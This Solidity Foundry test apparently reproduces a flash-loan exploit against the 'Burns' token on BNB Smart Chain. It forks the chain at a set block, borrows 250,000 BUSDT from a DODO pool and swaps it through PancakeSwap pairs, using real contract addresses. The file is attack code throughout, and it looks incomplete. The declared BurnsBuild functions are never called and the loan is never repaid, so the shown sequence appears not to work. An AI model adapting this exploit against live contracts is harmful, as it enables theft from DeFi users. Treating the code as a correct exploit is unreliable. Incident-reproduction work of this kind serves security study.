// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface/interface.sol";
import "forge-std/console2.sol";

interface IBurnsBuild {
    function burnToHolder() external;

    function receiveRewards(address to) external;
}

contract ContractTest is Test {
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant Burns =
        IERC20(0x91f1d3C7ddB8d5E290e71f893baD45F16E8Bd7BA);
    IWETH private constant WBNB =
        IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    DVM private constant DSP = DVM(0xD5F05644EF5d0a36cA8C8B5177FfBd09eC63F92F);
    Uni_Pair_V2 private constant BUSDT_WBNB =
        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 private constant Burns_WBNB =
        Uni_Pair_V2(0x928cd66dFA268C69a37Be93BF7759dc8Ee676Bf8);
    Uni_Router_V2 private constant PancakeRouter =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IBurnsBuild private constant BurnsBuild =
        IBurnsBuild(0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD);

    address private constant exploiter =
        0xC9FBCf3EB24385491f73BbF691b13A6f8Be7C339;

    function setUp() public {
        vm.createSelectFork("bsc", 35858189);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(Burns), "Burns");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(DSP), "DSP");
        vm.label(address(BUSDT_WBNB), "BUSDT_WBNB");
        vm.label(address(Burns_WBNB), "Burns_WBNB");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(BurnsBuild), "BurnsBuild");
        vm.label(exploiter, "Exploiter");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        deal(address(this), 0);
        console2.log(
            "BUSDT attack: ",
            BUSDT.balanceOf(exploiter),
            BUSDT.decimals()
        );
        console2.log(
            "Burns attack: ",
            Burns.balanceOf(exploiter),
            Burns.decimals()
        );
        // borrow BUSDT
        bytes memory data = abi.encodePacked(uint8(49));
        DSP.flashLoan(250_000 * 1e18, 0, address(this), data);

        console.log(
            "BUSDT balance: ",
            BUSDT.balanceOf(exploiter),
            BUSDT.decimals()
        );
        console.log(
            "Burns balance: ",
            Burns.balanceOf(exploiter),
            Burns.decimals()
        );
    }

    function DSPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        BUSDTToBurns(baseAmount);
    }

    function BUSDTToBurns(uint256 amount) private {
        BUSDT.transfer(address(BUSDT_WBNB), amount);
        (uint112 reserveBUSDT, uint112 reserveWBNB, ) = BUSDT_WBNB
            .getReserves();
        console.log("reserveBUSDT ", reserveBUSDT, reserveWBNB);
        uint256 amountWBNB = PancakeRouter.getAmountOut(
            amount,
            reserveBUSDT,
            reserveWBNB
        );
        console.log("amountWBNB ", amountWBNB);
        BUSDT_WBNB.swap(0, amountWBNB, address(Burns_WBNB), "");
        (uint112 reserveBurns, uint112 _reserveWBNB, ) = Burns_WBNB
            .getReserves();
        uint256 amountBurns = PancakeRouter.getAmountOut(
            amountWBNB,
            _reserveWBNB,
            reserveBurns
        );
        Burns_WBNB.swap(amountBurns, 0, address(this), "");
    }

    receive() external payable {}
}
